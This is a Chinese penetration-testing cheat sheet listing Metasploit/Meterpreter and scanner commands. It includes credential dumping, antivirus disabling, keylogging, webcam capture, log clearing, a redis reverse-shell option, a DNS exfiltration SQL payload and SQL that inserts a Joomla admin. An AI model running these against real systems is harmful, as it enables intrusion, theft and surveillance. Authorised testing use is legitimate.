综合框架
----------------------------------------

漏洞检测
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ metasploit
	- Terminal下msf常用命令简介
		+ 打开msf终端：``msfconsole``
		+ 将汇编指令转换成为对应的16进制机器码：``msf-nasm_shell``
		+ 设置全局变量
			::
			
				set proxies socks5:127.0.0.1:7222
				set ReverseAllowProxy true
	- msf终端下常用命令简介
		+ 显示命令的帮助信息：``help [db_connect]``
		+ 搜索含有关键字的模块：``search [module]``
		+ 选择模块：``use [module]``
		+ 显示模块支持的payload：``show payload``
		+ 显示模块参数：``show options``
		+ info详情：``info``
		+ 设置取消参数：``set/unset [opt]``
		+ 设置取消全局参数：``setg/unsetg [opt]``
		+ 返回上级状态：``back``
		+ 运行攻击模块：``exploit/run``
		+ 查看当前连接会话：``sessions``
+ meterpreter
	- 基本系统命令
		+ ``sessions -h`` ：查看帮助
		+ ``sessions -i <ID值>`` ：进入会话   -k  杀死会话
		+ ``background`` ：将当前会话放置后台
		+ ``info`` ：查看已有模块信息
		+ ``getuid`` ：查看获取的当前权限
		+ ``getsystem`` ：提权
		+ ``getpid`` ：获取当前进程的pid
		+ ``sysinfo`` ：查看目标机系统信息
		+ ``ps`` ：查看当前活跃进程    
		+ ``kill <PID值>`` ：杀死进程
		+ ``idletime`` ：查看目标机运行时间
		+ ``hashdump`` ：从SAM数据库导出密码的哈希
		+ ``reboot/shutdown`` ：重启/关机
		+ ``shell`` ：进入目标机cmd shell,windows环境下中文乱码的解决办法:chcp 65001
		+ 退出shell模式，返回到meterpreter：``Ctrl+Z``
		+ ``load kiwi`` ：加载wiki模块
			::
			
				creds_all：列举所有凭据
				creds_kerberos：列举所有kerberos凭据
				creds_msv：列举所有msv凭据
				creds_ssp：列举所有ssp凭据
				creds_tspkg：列举所有tspkg凭据
				creds_wdigest：列举所有wdigest凭据
				dcsync：通过DCSync检索用户帐户信息
				dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
				golden_ticket_create：创建黄金票据
				kerberos_ticket_list：列举kerberos票据
				kerberos_ticket_purge：清除kerberos票据
				kerberos_ticket_use：使用kerberos票据
				kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
				lsa_dump_sam：dump出lsa的SAM
				lsa_dump_secrets：dump出lsa的密文
				password_change：修改密码
				wifi_list：列出当前用户的wifi配置文件
				wifi_list_shared：列出共享wifi配置文件/编码
		+ ``run`` ：使用扩展库，输入run后按两下tab列出已有的脚本
			::
			
				run post/windows/manage/migrate                  #自动进程迁移    
				run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上   
				run post/linux/gather/checkvm                    # 是否虚拟机
				run post/windows/manage/killav                   #关闭杀毒软件    
				run post/windows/manage/enable_rdp               #开启远程桌面服务    
				run post/windows/manage/autoroute                #查看路由信息    
				run post/windows/gather/dumplinks                #获取最近的文件操作
				run post/windows/gather/enum_logged_on_users     #列举当前登录的用户    
				run post/windows/gather/enum_applications        #列举应用程序    
				run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码    
				run windows/gather/smart_hashdump                #dump出所有用户的hash
		+ ``run killav`` ：关闭杀毒软件
		+ ``run scraper`` : 查看目标主机详细信息
	- execute执行文件
		+ ``execute`` : 参数  -f 可执行文件   # 执行可执行程序
		+ ``execute -H -i -f cmd.exe`` : 创建新进程cmd.exe，-H不可见，-i交互
	- 目录/文件操作
		+ ``pwd/getwd`` : 目标机器上当前目录(windows)
		+ ``cd`` : 目标机器上切换目录
		+ ``ls`` : 目标机器上显示
		+ ``dir`` : 目标机器上查看
		+ ``mkdir dir1 dir2`` : 
		+ ``mv oldfile newfile`` : 
		+ ``rmdir dir1`` : 
		+ ``getlwd / lpwd`` : 查看攻击机当前目录(Linux)
		+ ``lls`` : 在攻击机显示
		+ ``lcd`` : 在攻击机上切换目录
		+ ``cat C:\\Users\\zq\\Desktop\\123.txt`` : 目标机器上读取内容
		+ ``edit C:\\Users\\zq\\Desktop\\123.txt`` : 篡改目标机器上的文件
		+ ``search -f *.jsp -d e:\`` : 搜索E盘中所有以.jsp为后缀的文件
		+ ``upload /test.x C:\\Users\\zq\\Desktop`` : 将文件传到目标机的桌面
		+ ``download C:\\123.txt /root`` : 将目标机文件下载到/root目录下
	- 时间戳伪造
		+ ``timestomp C:// -h`` : 查看帮助
		+ ``timestomp -v C://2.txt`` : 查看时间戳
		+ ``timestomp C://2.txt -f C://1.txt`` : 将1.txt的时间戳复制给2.txt 
	- 进程
		+ ``ps`` : 查看目标主机活跃进程信息
		+ ``getpid`` : 查看当前Meterpreter Shell的进程
		+ ``migrate 1732`` : 将当前Meterpreter Shell的进程迁移到PID为1732的进程上，这样不容器被发现
		+ ``kill <pid值>`` : 杀死进程
	- 网络
		+ ``run get_local_subnets`` : 获取目标主机上的子网状态
		+ ``db_nmap`` : 扫描内网存活主机
		+ ``arp`` 显示目标机器arp缓存
		+ ``getproxy`` 显示目标机器的代理
		+ ``ifconfig``
		+ ``netstat -ano``
		+ ``route``
		+ ``portfwd`` 端口重定向
		+ ``portfwd add -l 3389 -p 3389 -r 172.16.0.100`` 将目标机的3389端口转发到本地3389端口
		+ 然后直接在本地使用命令远程登录：``rdesktop 127.0.0.1``
	- 添加路由
		+ run autoroute –h    # 查看帮助
		+ run autoroute -s 192.168.159.0/24  # 添加到目标环境网络
		+ run autoroute –p  # 查看添加的路由
		+ 扫描
			- ``run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24``
			- ``run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389`` 
	- uictl开关键盘/鼠标
		+ ``uictl [enable/disable] [keyboard/mouse/all]`` 开启或禁止键盘/鼠标
		+ ``uictl disable mouse`` 禁用鼠标
		+ ``uictl disable keyboard`` 禁用键盘
	- 用户接口命令（键盘嗅探，鼠标、屏幕、音频、摄像头）
		+ ``keyscan_start`` : 开启键盘记录功能
		+ ``keyscan_dump`` : 显示捕捉到的键盘记录信息
		+ ``keyscan_stop`` : 停止键盘记录功能
		+ ``mouse`` : 鼠标命令
		+ ``screenshare`` : 屏幕监控
		+ ``screenshot`` : 截图
		+ ``record_mic`` : 音频
		+ ``play *.wav`` : 播放音频
		+ ``webcam_list`` : 查看目标主机的摄像头
		+ ``webcam_snap`` : 目标主机摄像头拍照
		+ ``webcam_stream`` : 目标主机通过摄像头开视频
		+ ``webcam_chat -h`` : 开始与目标进行视频对话。
		+ ``run vnc`` : 运行vnc远程查看屏幕
	- clearav清除日志
		+ clearev
+ vulmap【web】
	- 项目地址：``https://github.com/zhzyker/vulmap``
	- 安装
			::
			
				git clone https://github.com/zhzyker/vulmap.git
				pip3 install -r requirements.txt
				
	- 基本用法：``python3 vulmap.py -u http://example.com``

+ xray【web】
	- 全局配置
		+ --config 用于指定配置文件的位置，默认加载同目录的 config.yaml
		+ --log_level 用于指定全局的日志配置
		+ ``xray_windows_amd64.exe --log_level debug --config 1.yaml webscan --url xxx``
	- reverse命令
		+ 启用单独的盲打平台服务，盲打平台用于处理没有回显或延迟触发的问题
	- genca
		+ 用于快速生成一个根证书，主要用于被动代理扫描 HTTPS 流量时用到
	- subdomain
		+ 子域名扫描
		+ ``xray_windows_amd64.exe  subdomain --target example.com --text-output example.txt``
		+ ``xray_windows_amd64.exe subdomain --target example.com --console-ui --text-output example.txt``
	- webscan
		+ 扫描web漏洞，核心功能
		+ --plugins 配置本次扫描启用哪些插件, 不再使用配置文件中的配置
			- ``--plugins xss --plugins xss,sqldet,phantasm``
		+ --poc 配置本次扫描启用哪些 POC,因为所有 POC 隶属于 phantasm 插件, 所以该参数其实是 phantasm 插件独有的配置。
			- ``--plugins phantasm --poc poc-yaml-thinkphp5-controller-rce``
			- ``--plugins phantasm --poc "*thinkphp*"``
			- ``--plugins phantasm --poc "/home/test/pocs/*"``
			- ``--plugins phantasm --poc "/home/test/pocs/*thinkphp*" ...``
		+ 配置输入来源
			- --listen 
				+ 启动一个被动代理服务器作为输入，如 --listen 127.0.0.1:4444，然后配置浏览器或其他访问工具的 http 代理为 http://127.0.0.1:4444 就可以自动检测代理中的 HTTP 请求并进行漏洞扫描
			- --basic-crawler 
				+ 启用一个基础爬虫作为输入， 如 --basic-crawler http://example.com，就可抓取 http://example.com 的内容并以此内容进行漏洞扫描
			- --url 
				+ 用于快速测试单个 url，这个参数不带爬虫，只对当前链接进行测试。默认为 GET 请求，配合下面的 --data 参数可以指定 body，同时变为 POST 请求。
			- --raw-request 
				+ 用于加载一个原始的 HTTP 请求并用于扫描，原始请求类似上面代码框中的原始请求，如果你用过 sqlmap -r，那么这个参数应该也很容易上手。
		+ 输出方式
			- --html-output 将结果输出为 html 报告, 报告样例
			- --webhook-output 将结果发送到一个地址
			- --json-output 将结果输出到一个 json 文件中
		+ 示例
			- ``xray_darwin_amd64 webscan --plugins xss --listen 127.0.0.1:1111 --html-output 1.html``
			- ``xray_darwin_amd64 --log_level debug webscan --plugins xss,cmd_injection --basic-crawler http://example.com --json-output 1.json``
			- ``xray_darwin_amd64 webscan --url http://example.com --data "x=y" --html-output 2.html --json-output 1.json``
			- ``xray_darwin_amd64 webscan --url http://example.com/ --webhook-output http://host:port/path``

综合
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ ARL 资产侦察灯塔系统
	::

		git clone https://github.com/TophantTechnology/ARL
		cd ARL/docker/
		docker volume create arl_db
		docker-compose pull
		docker-compose up -d 
		
		默认端口5003 (https), 默认用户名密码admin/arlpass

+ ShuiZe_0x727
	- 项目：``https://github.com/0x727/ShuiZe_0x727``
	- 协助红队人员快速的信息收集，测绘目标资产，寻找薄弱点。
	- 全方位收集相关资产，并检测漏洞。也可以输入多个域名、C段IP等。
+ LiqunKit
	- 项目：``https://github.com/Liqunkit/LiqunKit_``
	- 漏洞辅助工具箱，包含致远OA，泛微OA，万户OA，蓝凌OA，用友OA，通达OA，weblogic，struts2，thinkphp，shiro，数据库综合。
+ 带带弟弟
	- 项目：``https://github.com/SleepingBag945/dddd``
	- 示例：
		::
		
			# 指定IP禁Ping全端口扫描指定端口
			./dddd -t 172.16.100.1 -p 80,53,1433-5000 -Pn
			先配置./config/subfinder-config.yaml中的FOFA 邮箱和KEY。
				fofa: ["xxxx@qq.com:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"]
			./dddd -t "domain=\"baidu.com\"" -fofa (从fofa取100个baidu.com域名的目标)
			./dddd -t "domain=\"baidu.com\"" -fofa -ffmc 10000 (指定最大数量为10000 默认100)
+ fscan
	- 项目地址：``https://github.com/shadow1ng/fscan``
	- 示例
		::
		
			fscan.exe -h 192.168.1.1/24  (默认使用全部模块)  
			fscan.exe -h 192.168.1.1/16  (B段扫描)
			fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)  
			fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)  
			fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)  
			fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)  
			fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)  
			fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)  
			fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)   
			fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )  
			fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)  
			fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)  
			fscan64.exe -h 10.10.180.0-10.10.180.255 -p 445 -sc ms17|findstr "MS17-010"（指定模块）
			fscan.exe -hf ip.txt  (以文件导入)
+ Template 
	+ 项目地址：https://github.com/1n7erface/Template
+ afrog
	+ 项目地址：https://github.com/zan8in/afrog
+ uniscan
+ goon
	- 项目地址：``https://github.com/i11us0ry/goon``
	- goon,集合了fscan和kscan等优秀工具功能的扫描爆破工具。
	- 功能包含：ip探活、port扫描、web指纹扫描、title扫描、fofa获取、ms17010、mssql、mysql、postgres、redis、ssh、smb、rdp、telnet等爆破以及如netbios探测等功能。
+ Railgun
	- 项目地址：``https://github.com/lz520520/railgun``
	- Railgun为一款GUI界面的渗透工具，将部分人工经验转换为自动化，集成了渗透过程中常用到的一些功能，目前集成了端口扫描、端口爆破、web指纹扫描、漏洞扫描、漏洞利用以及编码转换功能，后续会持续更新。
+ SweetBabyScan
	- 项目地址：``https://github.com/inbug-team/SweetBabyScan``
	- 轻量级内网资产探测漏洞扫描工具，支持弱口令爆破的内网资产探测漏洞扫描工具，集成了Xray与Nuclei的Poc
+ Ladon
	- 项目地址：``https://github.com/k8gege/Ladon``

特定CMS漏洞利用
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ Joomscan
	- 介绍
		+ Joomla security scanner可以检测Joomla整站程序搭建的网站是否存在文件包含、sql注入、命令执行等漏洞。
	- 使用方法
		+ 默认检测：``joomscan -u www.example.com``
		+ 组件检测：``joomscan -u www.example.com –ec``
		+ 设置cookie：``joomscan -u www.example.com --cookie "test=demo;"``
		+ 随机UA：``joomscan -u www.example.com -r``
		+ 设置代理：``joomscan -u www.example.com --proxy http://127.0.0.1:8080``
	- 数据库权限改管理员密码
		::
		
			以下两条命令成功创建joomla后台用户admin2/secret的超级管理员
			INSERT INTO `am2zu_users` (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`) VALUES ('Administrator2', 'admin2','d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199', '', NOW(), NOW(), NOW());
			INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`) VALUES (LAST_INSERT_ID(),'8');
+ wpscan
	- 插件漏洞:``wpscan --url https://www.xxxxx.wiki/ -e vp`` 
	- 主题漏洞:``wpscan --url https://www.xxxxxx.wiki -e vt`` 
	- 枚举用户:``wpscan --url https://www.xxxxxxx.wiki/ -e u`` 
	- 穷举密码:``wpscan --url https://www.xxxxxxx.wiki/ -U 'admin' -P /root/wordlist.txt``
+ Drupal enumeration & exploitation tool 
	- https://github.com/immunIT/drupwn
+ `dedecmscan <https://github.com/lengjibo/dedecmscan>`_ 织梦全版本漏洞扫描
+ thinkphp
	- https://github.com/Lucifer1993/TPscan
	- https://github.com/theLSA/tp5-getshell


带外数据监控
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ dnslog
	- 利用场景
		+ Sql-Blind
		+ RCE
		+ SSRF
		+ RFI（Remote File Inclusion）
	- 原理
		将dnslog平台中的特有字段payload带入目标发起dns请求，通过dns解析将请求后的关键信息组合成新的三级域名带出，在ns服务器的dns日志中显示出来。
	- 限制
		load_file函数在Linux下是无法用来做dnslog攻击的，因为Linux没有UNC路径(UNC路径就是类似\\softer这样的形式的网络路径)。
	- 示例
		+ ``select load_file('\\\\',version(),'.dnslog地址')``
+ ceye.io
	- http://ceye.io/profile中记录了个人的Identifier
	- 可以请求任何http文件
	- dns请求记录

其它
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- AWVS
- goby
- Immunity Canvas
- openvas
- nessus
- `PenTesters Framework(ptf) <https://github.com/trustedsec/ptf>`_
- katoolin
	+ 自动安装所有Kali Linux工具
- `x-scan <https://x-scan.apponic.com/>`_
